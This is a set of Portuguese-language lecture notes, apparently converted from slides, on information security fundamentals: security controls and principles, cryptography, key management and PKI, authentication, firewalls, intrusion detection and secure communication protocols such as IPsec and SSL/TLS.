### Controlos de segurança
#### Tipos de Controlos

* **Técnicos**: firewall, detector de intrusões, sensor de movimento, detector de incêndio
* **Formais**: política de segurança, procedimentos
* **Informais**: centrados nas pessoas, formação, awareness

```
As pessoas em relação à segurança são sempre o elo mais fraco.
```

### Controlos de segurança
#### Controlos de Segurança

* **Dissuasão**: dissuadir os atacantes
* **Prevenção**: evitar falhas de segurança
* **Detecção**: detectar falhas de segurança
* **Correcção**: tolerar/corrigir falhas de segurança
* **Recuperação**: recuperar depois de falhas de segurança
* **Compensação**: mecanismos de segurança alternativos

### Risco de segurança
#### Risco e Objectivo

* **Risco**: possibilidade de sofrer dano ou perda, evento que pode causar impacto negativo
* **Objectivo**: mitigar (minimizar) o risco até um nível aceitável pelos decisores
* **Risco = valor perda estimada X probabilidade de perda**

### Princípios protecção da informação
#### 8 Princípios Saltzer and Schroeder

* **Privilégio Mínimo**: dar apenas privilégios necessários de acordo a tarefa/função
* **Predefinições Seguras (Fail-Safe)**: falhar de modo seguro, negar acesso por omissão
* **Economia de Mecanismo**: simplicidade, mais fácil de entender e testar (menos possibilidades de bugs)
* **Mediação Completa**: verificação contínua da autorização de aceder ao recurso, evitar caching de credenciais e possibilidade de circundar o mecanismo
* **Desenho Aberto (público)**: não depender de segredos de implementação, possibilidade de teste prévio por vários experts
* **Separação de Privilégios**: autorização com várias condições, separação por vários elementos
* **Mínimo Mecanismo Comum**: limitar dependências de informação
* **Aceitação Psicológica**: não dificultar a vida dos utilizadores

### Princípios protecção da informação
#### Outros Princípios

* **Confiabilidade (trustworthy)**: não assumir confiança implicitamente (será confiável?), assurance: garantia de nível de confiabilidade
* **Segurança por camadas (defense-in-depth)**: vários mecanismos de proteção autônomos
* **Minimizar exposição / superfície de ataque**: limitar sempre acesso a recursos

---
### 2.Criptografia
---
## Criptografia

### Terminologia

* Criptografia: Arte de escrever de forma **secreta**
* Cripto-análise: Estudo da possibilidade de **quebrar de algoritmos de cifra**
* Operações:
	+ Cifrar (encrypt): mensagem em texto claro para criptograma (mensagem cifrada)
	+ Decifrar (decrypt): criptograma para mensagem em texto claro

## Conceitos Base

* Tipos de operações:
	+ Substituição
	+ Transposição ou permutação
	+ Combinações ou produtos dos 2 tipos
* Número de chaves:
	+ Cifra simétrica: 1 chave privada (partilhada)
	+ Cifra assimétrica: 2 chaves: pública e privada
* Processo:
	+ Unidireccional (hashing) ou Bidireccional
	+ Stream (contínuo) ou bloco
* Quebra da cifra depende da qualidade do **algoritmo e do tamanho da chave**
* Princípio Kerchoffs: **Um sistema de cifra não deve depender do segredo de funcionamento do seu algoritmo**

## Ataques de cripto-análise

* Apenas texto cifrado (ciphertext-only):
	+ Tentar obter a mensagem em claro (e a chave) apenas com a mensagem cifrada
* Mensagem em claro conhecida (known-plaintext):
	+ Tentar obter a chave com a mensagem cifrada e em claro
* Mensagem em claro escolhida (chosen-plaintext):
	+ Escolhe mensagens específicas em claro para serem cifradas e tenta obter a chave
* Mensagem cifrada escolhida (chosen-ciphertext):
	+ Escolhe mensagens específicas cifradas para serem decifradas e tenta obter a chave

## Ataques de cripto-análise

* Estatísticos:
	+ Análise da distribuição de letras e pares de letras
	+ Modelos da linguagem
	+ Exemplos: “e”, “o”, “a”, “de”, “em”
* Matemáticos:
	+ Análise matemática das bases do algoritmo

## Bruteforce
_Fonte: Stallings_

* Um ataque de força bruta percorre todas as **combinações para encontrar a chave**

## Cifras stream e bloco

* Cifras stream (contínuas/sequenciais/de fita):
	+ Converte 1 caractere em texto claro para 1 caractere de texto cifrado
	+ Rápido, fraca propagação de erros, baixa difusão, susceptível a inserção e eliminações maliciosas, vocacionadas para hardware
* Cifras de bloco:
	+ Um grupo de caracteres em claro são cifrados para 1 bloco
	+ Alta difusão, imunidade a inserções, lento, propagação de erros, vocacionadas para software
* Difusão: Uma mudança de um símbolo no texto em claro **muda completamente o texto cifrado**
* Confusão: Não deve ser possível prever o que acontece ao **texto cifrado mudando um símbolo no texto em claro**


## Cifras Stream

* Cada bit ou byte (8 bits) é cifrado **individualmente**
* A chave é a semente do pseudo gerador aleatório **(PRG ou PRNG)**
* Porquê pseudo? Algures no tempo o PRG vai **repetir a sequência**
* Utiliza a primitiva XOR para cifrar e decifrar

_Fonte: ubbcluj.ro_

## Modos Operação Cifras Bloco

_Fonte: Wikipedia_

* Electronic Codebook (ECB):
	+ Mensagem dividida em blocos e cada bloco cifrado individualmente
	+ Cada bloco em claro igual tem um criptograma igual e vice versa
	+ Não indica se os blocos cifrados foram alterados

## Modos Operação Cifras Bloco

_Fonte: Wikipedia_

* Cipher-block chaining (CBC):
	+ É estabelecida uma cadeia com o XOR da mensagem em claro com a mensagem cifrada anterior
	+ É utilizado um vector de inicialização (sequencia de bits) comum igual ao tamanho do bloco
	+ Blocos iguais mapeados para criptogramas diferentes
	+ Auto sincronizável: um erro no bloco Cx permite a decifragem do bloco Cx+

## Modos Operação Cifras Bloco

_Fonte: Wikipedia_

* Propagating cipher-block chaining (PCBC):
	+ Propaga erros de transmissão e possibilita a detecção de erros

## Modos Operação Cifras Bloco

_Fonte: Wikipedia_

* Cipher feedback (CFB): Transforma uma cifra de bloco numa cifra contínua auto **sincronizável**
* Output feedback (OFB): Transforma uma cifra de bloco numa cifra contínua **sincronizada**
* Tolerância aos erros: um bit errado no texto cifrado afecta apenas um bit no texto limpo

## Modos Operação Cifras Bloco

_Fonte: Wikipedia_

* Counter (CTR): Transforma uma cifra de bloco numa cifra contínua usando uma nonce **(vector de inicialização) e um contador**
* Possibilita a cifra em blocos paralelos

## Cifra Simétrica

* Chave privada partilhada pelas várias entidades envolvidas na comunicação
* Mesma chave utilizada para cifrar e decifrar
* Boa performance (eficiência), facilidade de implementação em hardware e chaves menores
* Problemas na difusão da chave e na escalabilidade

_Fonte: Infosectoday_

## Algoritmos cifra simétrica

_Fonte: Wikipedia_

* RC4 - Desenvolvido e patenteado pela RSA em 1987 e exposto em 1994 na internet
	+ Simples e de alta performance
	+ Cifra stream byte a byte
	+ Tamanho da chave variável (1 - 256 bytes ou 1-2048 bits)
	+ Usado de forma errada em diversas tecnologias: WEP e SSL

## Algoritmos cifra simétrica

_Fonte: Universidade Colorado_

* DES - Data Encryption Standard
	+ Desenvolvido pela IBM em 1972 e em 1976 US Standard
	+ Primeiro standard criptográfico
	+ Supostamente enfraquecido de início, com chaves para exportação fora dos EUA com 40 bits
	+ Transposição + Substituição
	+ Chave = 56 bits + 8 bits de paridade
	+ Cifra de blocos de 64bits

## Algoritmos cifra simétrica

* 3DES – Triple Data Encryption Standard 1998
	+ Próxima hipótese depois do double DES ser vulnerável ao ataque “meet in the middle” (com este ataque chave 2 X 2^56 = 2^57)
	+ Podem ser usadas 2 ou 3 chaves
		- 2 chaves : 112 bits (56+56) (com ataques conhecidos 80bits)
		- 3 chaves: 168 bits (com ataques conhecidos 112bits)
	+ Cifra de blocos de 64 bits

## Algoritmos cifra simétrica

* IDEA- International Data Encryption Algorithm
	+ Desenhado por James Massey e Xuejia Lai em **1991**
	+ Patenteado e necessário uma licença para fins comerciais
	+ Patente expirou em 2012
	+ Chave 128 bits
	+ Cifra de blocos de 64 bits

## Algoritmos cifra simétrica

* AES- Advanced Encryption Standard 1999
	+ NIST lançou um concurso para um novo algoritmo de cifra em Outubro de 2000
	+ Requisitos de avaliação: segurança, aleatoriedade do output, licenciamento gratuito, base matemática, requisitos computacionais e de memória, simplicidade, performance em software e hardware e flexibilidade
	+ Algoritmos são atacados publicamente
	+ Vencedor foi o Rijndael
	+ Chaves de 128, 192, 256 bits
	+ Blocos de 128, 192, 256 bits

## Algoritmos cifra simétrica

_Fonte: Pfleeger_

## Cifra Assimétrica

* Par de Chaves (2 chaves relacionadas)
	+ 1 Privada e intransmissível
	+ 1 Pública conhecida pelos intervenientes na comunicação
* Uma chave cifra e outra decifra
* Impossível de obter uma chave a partir da outra

_Fonte: Infosectoday Destination_

## Cifra Assimétrica

* Possibilidade provar a identidade **(autenticação/assinar)**
* Menor performance e chaves maiores
* Escalabilidade e difusão chave pública

_Fonte: Infosectoday Source_

## Algoritmos cifra assimétrica

* RSA – Rivest, Shamir, Adelman 1978
	+ Cifra de exponenciação
	+ Baseada na dificuldade de encontrar os números relativamente primos (gcd(a, b) = 1) de inteiros gigantes (> 100 dígitos)
	+ Chaves de 1024, 2048, 4096 bits
	+ Proprietário, mas a patente expirou em 2000

_Fonte: Stallings_

## Diffie-Hellman

* Cria uma chave partilhada a partir do zero **sem a passar em claro**
* Problema: Não há autenticação, vulnerável a **ataques MITM (man in the middle)**

_Fonte: Stallings_

## Ataque MITM Diffie-Hellman

_Fonte: wikipedia_

## Comparação

_Fonte: Pfleeger_

## Mindmap

_Fonte: hut.fi_

## Checksums Criptográficos

* Algoritmos que produzem uma síntese da **mensagem**
* Padding: adição de bits para dar o tamanho de **bloco correcto**
* Unidireccional (one-way): Com o checksum não é **possível derivar a mensagem**
* Resistência a colisões: 2 Mensagens diferentes **não podem dar um checksum igual**
* 2 Tipos:
	+ Hash
	+ MAC: Message Authentication Code

## Message Authentication Code

* Usa uma chave partilhada
* Garante autenticação e integridade
* 2 Tipos:
	+ Cifras de bloco
	+ HMAC

_Fonte: Wikipedia_

## Paradoxo do Aniversário

* Probabilidade de 50% de 2 pessoas fazerem **anos no mesmo dia** num grupo de 23 pessoas
* Colisão: 2 Inputs diferentes dão o mesmo **resultado**
* Este paradoxo atenta contra um dos princípios **dos checksums criptográficos**
* Forjar uma mensagem que dê o mesmo resultado **que o checksum da mensagem original**
* Com este principio as sínteses ficam com uma **segurança máxima inicial de 2^N/2**

## Funções de Hash

* MD5 (Rivest 1991)
	+ 128 bits, blocos de 512 bits
	+ Ataque optimizado com colisões (2^39), testado com sucesso para forjar certificados e documentos
	+ Não recomendado para uso actual
* SHA-1 (NSA 1993)
	+ 160 bits, blocos 512 bits
* SHA- 2
	+ 224, 256, (blocos 512)
	+ 384, 512 bits, (blocos 1024 bits)
* SHA- 3
	+ Concurso: escolhido algoritmo Keccak
	+ 224, 256, 384, 512 bits

## Steganografia

* É a arte de esconder mensagens dentro de outras **mensagens**
* Passar informação sem atrair atenções
* Pode ser usado para provar direitos de autor **(watermark)**
* Não é criptografia

---
### 3. Gestão chaves
---
## Gestão de chaves

### Problemas gestão de chaves

* Distribuição de chaves
	+ Criptografia simétrica
		- Não é escalável, intercepção da chave secreta
	+ Criptografia assimétrica
		- O receptor pode não ser quem apresenta ser (impersonation/personificação)
* Geração de chaves
	+ As chaves não devem ser previsíveis, mas dispositivos electrónicos têm dificuldades em gerar aleatoriedade
	+ Confinamento: Devem ser geradas e guardadas em dispositivos seguros para prevenir a sua exposição (smartcard, token, TCB)

### Conceitos gestão de chaves

* Por quanto tempo deve ser usada uma chave?
	+ Demasiada utilização da chave facilita a sua descoberta
* Solução: Chaves de sessão através de uma chave mestra
* Chaves de longa duração
	+ Chaves mestras
* Chaves de curta duração
	+ Chaves de sessão (temporárias)
	+ Renegociação periódica

### Key distribution center

* KDC: Distribuição de chaves centralizada
	+ Ponto único de confiança e de falha
	+ Cada nó partilha uma chave simétrica com o KDC
	+ Quando 1 nó deseja falar com o outro pede ao KDC para criar uma chave partilhada entre os 2 nós e envia a mesma para os 2 cifrada com a chave que partilham com o KDC

Fonte: CMUQuatar

## Kerberos

* Desenvolvido pelo MIT com base no protocolo simétrico Needham-Schroeder
* Composto por 2 serviços:
	+ AuthenticationServer
	+ Ticket GrantingService/Server
* Trusted third party
* Sincronização temporal
	+ Tickets expiram

Fonte: ZDNet

## PKI

* PKI: Infra-estrutura de chave pública
	+ Funções de registo/assinatura, validação e revogação de certificados (ciclo de vida)
* Certificado Digital
	+ Liga uma chave pública a uma entidade (individual, empresarial, website) através da confiança numa CA (autoridade certificadora)
	+ Contém no mínimo a chave pública e a assinatura da CA
	+ Por vezes a CA não assina pedidos (fazendo apenas a validação), nesse caso existe uma autoridade de registo em separado (RA)

### Recuperação de chaves

* Keyescrow: informação necessária para recuperar a chave privada
	+ Ajuda a resolver disputas legais
	+ Cópia da chave privada na CA ou em ambiente confiável de terceiros
* Deve existir meio de recuperar a chave?
	+ Pode fazer sentido se a chave privada for associada a uma função da empresa
* Vai contra o princípio de não repudiação

## Assinatura digital

* Associa uma mensagem a uma entidade univocamente
* Prova o conteúdo da mensagem e autentica o emissor (integridade)
* Insere data/hora de assinatura (não reutilização)
* Deve ser possível provar a origem dessa assinatura perante terceiros (não repudiação)
* Tem de existir uma relação de confiança com a entidade certificadora que assinou a chave pública do assinante

Fonte: wikipedia

## Assinatura Certificado

Fonte: Stallings

* Assinatura do pedido de certificado pela CA

## Cadeia de Certificados

Fonte: Pfleeger

* Existe uma clara hierarquia de certificados

### Verificação Certificado

* Percorre toda a cadeia de certificação inversa desde a CA que assina o certificado directamente até encontrar uma CA superior de confiança e depois valida a assinatura desde essa CA de confiança até ao nó

Fonte: USYD.EDU

## Formato Cert X.

* Framework de formato utilizado nos certificados
* Liga o certificado a um endereço web, email, username
* Nas extensões define o propósito do certificado
* Apenas assinatura, autenticação, cifrar/decifrar ou combinações dos mesmos
* Políticas associadas

Fonte: ETH Zurich

## Revogação Cert X.

* CRL – Listas de revogação de certificados
* Lista periódica de certificados revogados assinada pela CA (integridade)
* No processo de validação do certificado é necessário aceder à CRL (lista local ou site remoto: ldap ou http) para verificar se o certificado ainda é válido

Fonte: ETH Zurich

## Pretty Good Privacy

* PGP: Cifra assimétrica para dados usada no email e ficheiros
* Desenvolvido por Phil Zimmermann em 1991
* Versão gratuita e comercial com suporte
* Sem hierarquia predefinida, baseia-se num sistema em teia (web of trust)
* Cada nó nomeia o nível de confiança que tem em vários outros nós que conhece (confiança transitiva)
* Utiliza cifra assimétrica para estabelecer uma chave partilhada (chave de sessão)
* Sempre seguiu uma metodologia não ligada a entidades governamentais e revelou ser robusta a vários casos judiciais

Fonte: Data-processing

---
### 4. Autenticação
---
## Autenticação e Autorização

### Conceitos Base

* Sistemas/protocolos AAA:
	+ Autenticação: provar a identidade
	+ Autorização: lista de permissões ou regras de controlo de acesso associadas à identidade autenticada
* Accounting: rastreabilidade/auditabilidade do uso de recursos
* Controlo de acesso: Protecção de recursos contra acesso não autorizado

## Factores de Autenticação

* 3 factores base de autenticação:
	+ Algo que se sabe: password, PIN
	+ Algo que se tem: smartcard
	+ Algo que se é: biometria
* Alguma literatura considera também estes factores:
	+ Algo que se faz: padrões de teclas, padrões de escrita
	+ Algo que indica onde se está (origem): GPS
* Quando tem pelo menos 2 dos factores chama-se autenticação forte ou multi-factor

## Matriz Controlo Acessos

* Matriz de controlo de acessos:
	+ Sujeitos X Objectos X Privilégios
* Privilégios: Own, Read, Write, eXecute
Fonte: Ethz.ch

## ACL e Listas de Capacidades

* Lista de controle de acesso (ACL): Visão a partir do Objecto
* Lista de capacidades: Visão a partir do Sujeito
Fonte: Ethz.ch

## Políticas Controlo Acessos

* Controlo de acesso discricionário (DAC):
	+ Utilizadores são donos de recursos e controlam o acesso aos mesmos (atribuem privilégios, transferem a posse do recurso)
* É uma política de controlo de acessos flexível
* Problemas:
	+ Utilizadores não têm noções de segurança nem grandes bases de tecnologia, logo leva a negligencia, erros e abuso
	+ Malware pode enganar o utilizador para receber privilégios adicionais

## Políticas Controlo Acessos

* Controlo de acesso mandatório (MAC):
	+ Conceito de rótulos (labels) de segurança estáticos para os objectos e autorizações formais de acesso aos mesmos (política global)
* Não existe transferência de permissões de acesso
* Sistema de controlo de acessos rígido (need to know)
* Usado em sistemas militares:
	+ Bell-LaPadula (confidencialidade)
	+ Biba (integridade)

## Políticas Controlo Acessos

* Controlo de acesso baseado em funções (RBAC):
	+ Controlo de acesso usado actualmente nas empresas (escalável)
* Permite responsabilidade e permissões sobrepostas
* Abstracção: Forma grupos de objectos e sujeitos com atributos iguais
* Hierarquia: A hierarquia organizacional determina os direitos
* Facilidade de gestão: alterações podem ser aplicadas a grupos e existe a possibilidade de herança das camadas inferiores

## Ataques Passwords

* Força bruta: Tentar todas a combinações
* Dicionário: Testar um conjunto de palavras predefinidas
* Rainbow tables:
	+ Pré computação de tabelas indexadas para memória para força bruta optimizada de hashes
* Uso de “salt” como prevenção deste ataque concatenando um valor pré-estabelecido com a password antes do processo de hashing
	+ Exemplo: hash(userid|password)

## Password Authentication Protocol

* PAP: Utilizador envia a password em claro e o servidor responde com autenticação válida ou inválida
Fonte: Thetcp/ipGuide
```
Client Server
```

## Challenge Response Protocol

* CHAP: O servidor envia um desafio, o utilizador envia a resposta com o desafio cifrado e o servidor valida ou invalida a autenticação
Fonte: Thetcp/ipGuide
```
Client Server
```

## RADIUS

* RADIUS: Remote Access Dial-in User Service
	+ Vários dispositivos autenticam o acesso num sistema central, recebem a autorização e são guardados registos de rastreabilidade (accounting)
* Dispositivo e Radius partilham uma chave
* Permite a um Radius fazer-se passar por cliente quando as credenciais são de outro domínio
Fonte: Wikipedia

## One Time Password

* OTP: password usada apenas 1 vez e depois torna-se inválida
* Lista de passwords gerada a partir de uma chave mestre (S/key)
* Password gerada com base numa sincronização temporal (time based token)
* Requer sincronização e tem expiração curta (1 min)
* Chave partilhada no servidor e token
* Pode suportar Challenge-Response
* Pode suportar um PIN associado ao token
Fonte: RSA

## Lamport S/KEY

* São geradas hashes consecutivas de uma password, o utilizador fica com essa lista e o servidor guarda a última
* O cliente envia a penúltima como a primeira password da lista (ordem inversa)
* O servidor autentica fazendo o hash da password recebida e comparando com a que tem gravada e for igual dá acesso e guarda esse hash
Fonte: Wikipedia

## Biometria

* Impressão digital, retina, iris, geometria da mão, reconhecimento facial, padrão da voz, escrita
* A aceitação da biometria depende de quanto intrusivo é o teste de autenticação
* False acceptance rate (FAR):
	+ Ser autenticado com dados de autenticação falsos
* False rejection rate (FRR):
	+ Ser rejeitado com dados de autenticação verdadeiros
* Cross error rate (CER) ou Equal error rate (EER):
	+ Funcionamento ideal do sistema
Fonte: CISSP StudyGuide

## Biometria

 17

* Fases de um processo biométrico:
	+ Registo (Enrollment): colocação do pin e da impressão digital pela 1ª vez
Fonte: Stallings

## Biometria

 18

* Fases de um processo biométrico:
	+ Verificação: O sistema verifica se conseguiu reunir as características suficientes para identificar o utilizador
Fonte: Stallings

## Biometria

 19

* Fases de um processo biométrico:
	+ Identificação: O sistema identifica o utilizador com base nas suas características
Fonte: Stallings

## Single Sign On

* SSO: utilizador autentica-se perante um sistema central de autenticação e não necessita de repetir a autenticação para aceder aos diversos sistemas/aplicações
* Facilita a usabilidade e gestão de autenticação
* Se a autenticação for comprometida o atacante tem acesso aos diversos sistemas
* Deve ser utilizada uma autenticação forte ou multi-factor com SSO
* Deve existir re-autenticação periódica
* Exemplo: Kerberos

## Recuperação Passwords

* Perguntas de segurança: permite a recuperação da password, quando não existe a autenticação através da presença física
* Não devem ser respostas possíveis de obter por um estranho (pesquisa de dados nas redes sociais)
* Não devem permitir bruteforce: Qual é a sua cor preferida?
* Utilizar meio alternativo: Envio de SMS

## Privacidade na Autenticação

* Como manter a privacidade:
	+ Pseudónimos
	+ Nicknames
	+ Avatares
* Pode ser feita a autenticação perante uma entidade confiável e associar pseudónimos para aceder a diversos serviços mantendo a privacidade

---
### 5.Firewalls
---
### Firewalls

## Objectivo
- Monitorizar e validar acessos entre redes:
  - Controlo acesso: características pacote rede, protocolo, serviço, autenticação
  - Controlo fluxo: direcção, estado, comportamento
  - Controlo conteúdos
- Utiliza um conjunto de regras previamente definidas para autorizar acessos e nega o acesso a tudo o que não for previamente autorizado
- Não podem existir excepções com tráfego que circunde a firewall
- Ponto único de controlo, não pode haver intrusão na Firewall

## Conceitos base
Fonte: tuebingen.de

## Tipos de firewall

### Filtragem de pacotes (Packet Filter)
- Filtra os pacotes analisando o cabeçalho (header)
  - IP origem e destino
  - TCP/UDP/ICMP
  - Port origem e destino
- Simplicidade e rapidez
- Logging limitado, sem conhecimento aplicacional, sem capacidades de autenticação adicional, não guarda estado de ligações, não flexível

### Stateful inspection
- Filtragem de pacotes com conhecimento do estado da ligação (relacionado, estabelecido)
- Mantém actualizada uma tabela de estados de ligações e estabelece relações com os pacotes que analisa
- Conhece os protocolos mais comuns (SMTP, FTP)
- Suportam protocolos mal comportados (active mode FTP, RPC)

### Proxy
- Circuit gateway (socks)
  - Serve para vários protocolos, actua na camada de sessão
- Application gateway (smtp relay, web proxy)
  - Específico para cada protocolo
- Cliente faz o pedido ao proxy definindo o serviço e destino a aceder e o proxy faz o pedido e devolve o resultado ao cliente depois de analisado
- Tem conhecimento dos modos de funcionamento dos protocolos e analisa todo o pacote, por essa razão tem a capacidade de analisar conteúdos
- Maior complexidade, pode não suportar protocolos mais recentes, pode fazer caching de conteúdo estático, pode fornecer autenticação adicional

## Tipos de firewall
 Fonte: Pfleeger 7

## DMZ
- Zona desmilitarizada:
  - Conceito militar: zona segura entre faixas de conflito
  - Segmento neutro fora da rede interna e também não na rede externa
  - Zona entre 2 firewalls ou num interface diferente de 1 firewall
  - Serviços como HTTP, DNS, SMTP
Fonte: cesarbr

## Network address translation
- NAT:
  - Mapeamento de IPs e ports entre diferentes redes
  - Limita a exposição do endereçamento e serviços utilizados
  - É mantida uma lista centralizada dos mapeamentos
Fonte: BuildingInternet FWs

## Arquitectura multi firewall
Fonte: Pfleeger
- Defesa por camadas (defense in depth)
  - Várias firewalls de diferentes fabricantes fornecem segurança adicional
  - Uma vulnerabilidade que affecte uma não afecta a outra

## Redundância
- Load balancing:
  - O tráfego é dividido entre as várias firewalls
  - Estão todas online
- Activa/passiva ou principal/secundária:
  - Uma firewall é a activa e a outra passiva
  - Quando existe problemas na activa a passiva passa para online e a outra para offline

---
### 6.IDS
---
## Detecção de intrusões

## Modelo Deming
* Sistemas no seu normal funcionamento
+ Utilizadores efectuam acções que correspondem a **um padrão normal de utilização**
* Utilizadores não efectuam acções contra a política **de segurança**
* Os processos efectuam acções de acordo com a **sua definição**
* Um sistema que é atacado corrompe estas **hipóteses, logo segundo este modelo é possível detectar uma intrusão**

## Objectivo IDS

* Detectar uma grande variedade de intrusões
	+ Detectar ataques conhecidos e desconhecidos
	+ Capacidade de adaptar-se a novos comportamentos de ataque e desvios de padrão de utilização
* Alertar atempadamente em caso de intrusão/ataque
* Fornecer informação objectiva sobre a intrusão/ataque
	+ Minimizar falsos positivos (ataque falso detectado) e falsos negativos (ataque verdadeiro não detectado)
* Manter-se escondido ou não detectável perante **atacantes**
* Não comprometer o normal uso de recursos
	+ Minimizar tráfego adicional e recursos de sistema

## Funcionamento IDS

* Recolhe informação de **várias fontes (sensores)**
	+ Logs, rede, configurações, ficheiros
* Guarda e analisa os **eventos significativos** dessa informação
* Classifica-os e tem a **capacidade de reagir** aos mesmos

Fonte: Pfleeger

## Tipos de IDS

### Com base em assinaturas ou base de conhecimento

* Analisa a utilização maliciosa com base em **assinaturas e padrões de ataques conhecidos**
* Utiliza um conjunto de regras predefinidas para detectar os ataques
* Necessidade de actualizações constantes com **assinaturas de ataques novos**
* Exemplos: opensource Snort, comercial Dragon

### Com base em anomalias

* Utiliza análise estatística, padrões de **comportamento e algoritmos de aprendizagem (machine learning)**
* Necessita de uma fase de pré aprendizagem dentro do comportamento normal ou esperado para poder detectar as excepções (baseline)
* Pode utilizar valores de limiar (threshold)
	+ Exemplo: Nr máximo de acessos falhados
* Uma anomalia pode não ser um ataque/intrusão
* Necessita de optimizações (tuning) periódicas

## Network IDS

* Tem acesso a tráfego de rede com vários destinos com **captura passiva (port mirroring/tap, firewall)**
* Analisa conteúdo desse tráfego
	+ Se o tráfego for cifrado não consegue analisar
* Deve obter os pacotes iguais aos que chegam ao **destino (ter a mesma visão que os hosts a proteger)**
* Tem dificuldade em detectar se houve realmente **uma intrusão (só vê o ataque)**
* O bloqueio do nids não deve ter impacto na rede **(fail-open)**

## Host IDS

* Pode ser individual ou pode ter agentes instalados nas **várias máquinas a monitorizar com gestão centralizada**
* Pode afectar a performance dos hosts e da rede
* Analisa a informação dos logs, configurações, ficheiros, **memória e outra que o agente ache relevante**
* Exemplo: chamadas ao sistema privilegiadas
* Pode ter conhecimento aplicacional específico
* Possibilita a análise de tráfego cifrado porque reside no **host onde ele é decifrado**
* Consegue perceber se a intrusão teve sucesso, mas o **atacante pode desligar o hids**

## Arquitectura IDS

* Agentes em vários hosts
* Sondas em redes locais
* Localizações diferentes
* Consola de gestão **centralizada**
* Agregação de **informação local no agente ou remota na consola de gestão**
* Correlação de eventos **para estabelecer um registo completo do ataque**

Fonte: Stallings

## IDS Evasion

* Negação de serviço
	+ Sobrecarga de informação para limitar a análise do IDS (exaustão de recursos)
	+ Pacote especial de negação de serviço para bloquear o IDS ou o sistema operativo onde ele se encontra
* Usar ataques espaçados no tempo para ficar **abaixo do limiar (threshold)**
* Usar técnicas de rede para não ser detectado
	+ Fragmentação de pacotes: fazer com que a visão dos pacotes no IDS seja diferente da visão do host atacado
	+ Exemplo: pacotes com baixo TTL (time to live)

## IPS

* Sistema de prevenção de intrusões: Quando **detectam um ataque actuam automaticamente sobre mecanismos de segurança (comportamento activo)**
* Adicionam uma regra de bloqueio temporário na **firewall**
* Desconectam uma máquina maliciosa da rede **com ou sem fios**
* Se for um falso positivo podem negar o acesso **a utilizadores legítimos**

## Resposta a intrusões

* Preparação:
	+ Planeamento das acções de resposta com definição de acções e responsabilidades
	+ Instalação e configuração dos sistemas de detecção de intrusões
* Identificação da intrusão
* Contenção da intrusão: isolar sistema vítima e **limitar acções adicionais do atacante**
* Erradicação da intrusão
* Recuperação do sistema vítima
* Reajustamento: lições aprendidas, medidas de **follow-up e possíveis acções legais**

## Honeypots

* Objectivo
* Taxonomia Honeypots
* Investigação Produção
* Interacção Baixa Média Alta
* Instalação Física Virtual
* Comportamento Estático Dinâmico
* Sistema isco monitorizado com o objectivo único de ser atacado
* Tecnologia de segurança proactiva, mecanismo de engano
* Não existe tráfego legitimo para eles por isso limita falsos positivos
* Avalia ameaças reais para percepcionar o nível de risco
* Conhecimento detalhado do modusoperandi do atacante
* Honeytoken: Item monitorizado colocado em localizações sensíveis
* Usos: IDS, Malware, Worms, Botnets, Spam, Phishing, Wireless, Web---

### 7.  Comunicação segura
---
## Comunicação segura
 1
## Virtual Private Network
 2
- VPN: Estabelecer uma comunicação isolada/privada criando um túnel dentro de outra rede (overlay network)
- Pode servir para dar acesso individual externo à rede interna
- Pode servir para cifrar todo o tráfego entre duas localizações de uma empresa

Fonte: Pfleeger

## Virtual LAN
 3
- VLAN: Permite criar várias redes segmentadas dentro de uma rede local
- Actua sobre a camada de data link com labels
- Dados apenas circulam dentro da mesma vlan
- Sem integridade e confidencialidade

Fonte: Skullbox.net

## IPSEC
 4
- Cifra e autentica todo tráfego na camada de rede IP
- Independência do transporte e aplicação utilizada
- Garante confidencialidade, integridade e não repudiação
- Transparente para os utilizadores
- Utiliza múltiplos algoritmos

Fonte: Stallings

## IPSEC
 5
- Extension Headers:
  - AH: Authentication Header
  - ESP: Encapsulating Security Payload

Fonte: Stallings

## IPSEC
 6
- AH: Garante a integridade e autenticidade através de MAC
- HMAC MD5 96bits , HMAC SHA-1 96 bits

Fonte: Stallings

## IPSEC
 7
- ESP: Garante a confidencialidade
- Three-key triple DES, RC5, IDEA, Three-key triple IDEA, CAST, Blowfish
- Podetambémgarantira integridade e autenticidade com MAC
- HMAC MD5 96bits , HMAC SHA-1 96 bits

Fonte: Stallings

## IPSEC
 8
- Security Associations (SA):
  - Relação 1 sentido entre emissor e receptor (tráfego bidireccional requer 2 SAs)
- Internet Key exchange (IKE): protocolo de troca de chaves híbrido
  - Internet Security Association and Key Management Protocol (ISAKMP): Framework que serve para gerir SAs e configurar os parâmetros
- Parâmetros SA:
  - IP Destino
  - SecurityProtocolIdentifier: AH ou ESP
  - Security parameter index (SPI): identifica a SA
- Security Policy Database (SPD): decide o que fazer com os pacotes que recebe
- Security Association Database: Gere a sequência de pacotes, algoritmos e chaves usadas e expiração da SA

## IPSEC
 9
- Modos de operação:
  - Modo de transporte: Protege camadas acima de IP
    - Host to Host (end to end)

Fonte: VPNsIllustrated

## IPSEC
 10
- Modos de operação:
  - Modo de túnel: Protege o pacote IP colocando-o dentro de um novo pacote IP
    - Host to Gateway, Gateway to Gateway

Fonte: VPNsIllustrated

## IPSEC
 11
- Modos de operação AH:

Fonte: CiscoPress

## IPSEC
 12
- Modos de operação ESP:

Fonte: CiscoPress

## IPSEC
 13
- Comparação modos de operação:

Fonte: Stallings

## IPSEC
 14
- Combinando AH e ESP:
  - Transport Adjacency

Fonte: VPNsIllustrated

## IPSEC
 15
- Combinando AH e ESP:
  - Iterating Tunneling with a Shared Endpoint

Fonte: VPNsIllustrated

## IPSEC
 16
- Combinando AH e ESP:
  - Iterating Tunneling with no Shared Endpoint

Fonte: VPNsIllustrated

## IPSEC
 17
- Problemas com NAT:
  - NAT altera o header IP, mas o header está autenticado em AH
  - NAT altera o checksum TCP/UDP que está cifrado pelo ESP
  - NAT pode alterar o port do IKE
- NAT-traversal: Encapsular ESP em UDP Transporte Túnel

Fonte: Ollikainen

## Secure Socket Layer
 18
- SSL 1.0 e SSL 2.0 desenvolvido pela Netscape em 1994 com vulnerabilidades reportadas pouco tempo depois
- SSL v3.0 da Netscape foi a última versão
- TLS 1.2 e TLS 1.1 (transport layer security):
  - Usados actualmente
  - TLS 1.0: Primeira alternativa ao SSL estandardizada pelo IETF, também conhecida por SSL 3.1

Fonte: Stallings

## Secure Socket Layer
 19
- SSL/TLS dividido em 4 sub-protocolos:
  - Handshake protocol: Negoceia e gere o estabelecimento da comunicação segura, escolhendo os algoritmos
  - Record protocol: Trata da fragmentação, compressão, integridade, autenticidade e confidencialidade dos pacotes
  - Change Cipher protocol: mudar os algoritmos utilizados
